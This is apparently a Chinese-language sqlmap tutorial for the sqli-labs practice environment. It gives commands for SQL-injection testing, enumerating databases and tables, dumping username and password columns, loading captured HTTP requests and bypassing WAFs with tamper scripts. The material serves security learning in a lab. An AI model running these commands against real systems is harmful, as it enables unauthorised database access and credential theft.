# **SQLMAP**

练习SQL注入可以使用[sqli-labs](https://github.com/Audi-1/sqli-labs)。

## GET注入

```
# 测试注入
sqlmap.py -u "url"
# 获取数据库
sqlmap.py -u "http://172.18.0.10/Less-1/?id=1" --dbs
# 获取当前使用的数据库 --current-db
sqlmap.py -u "http://172.18.0.10/Less-1/?id=1" --current-db
# 获取数据表，-D为数据库名
sqlmap.py -u "http://172.18.0.10/Less-1/?id=1" -D "security" --tables 
# 获取数据库列名，-T为数据库表名
sqlmap.py -u "http://172.18.0.10/Less-1/?id=1" -D "security" -T "users" --columns
# 获取指定字段的值
sqlmap.py -u "http://172.18.0.10/Less-1/?id=1" -D "security" -T "users" --dump -C"id,username,password" 
# 语句总结
-u 指定目标url
--dbs 列出数据库系统中的数据库
--current-db 列出当前使用的数据库
--tables 列出数据库中的数据表
--columns 列出数据表中的字段
--dump 获取指定的数据
```

## POST注入-自动获取表单

```
# 自动获取form表单测试
sqlmap.py -u "http://172.18.0.2/Less-11/" --forms
# 使用--dbs列出数据库系统所有数据库
sqlmap.py -u "http://172.18.0.10/Less-1/?id=1" --forms --dbs
# 使用--current-db列出系统当前数据库
sqlmap.py -u "http://172.18.0.10/Less-1/?id=1" --forms --current-db
# 列出数据库中的数据表
sqlmap.py -u "http://172.18.0.10/Less-1/?id=1" --forms --tables -D "security"
# 使用--columns列出表中的字段
sqlmap.py -u "http://172.18.0.10/Less-1/?id=1" --forms --columns -D "security" -T "users"
# 使用--dump获取字段中的数据
sqlmap.py -u "http://172.18.0.10/Less-1/?id=1" --forms --dump -C"id,username,password" -D "security" -T "users"
```

## POST注入-从文件中加载HTTP请求

配置代理，使用BurpSuite抓取数据包，【Copy file】保存至桌面为xx.txt

```
GET /Less-1/?id=1 HTTP/1.1
Host: 172.18.0.10
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

使用`-r`文件中加载HTTP请求

```
sqlmap.py -r C:\Users\admin\Desktop\xx.txt
```

## 绕过WAF

SQLMap下有一个名为tamper的目录，里面很多绕过waf的脚本，使用--tamper选项可以使用。

示例为：（宽字节注入）绕过

```
sqlmap.py -u "http://172.18.0.2/Less-32/?id=1" --batch -v 3 --tamper "unmagicquotes.py"
```
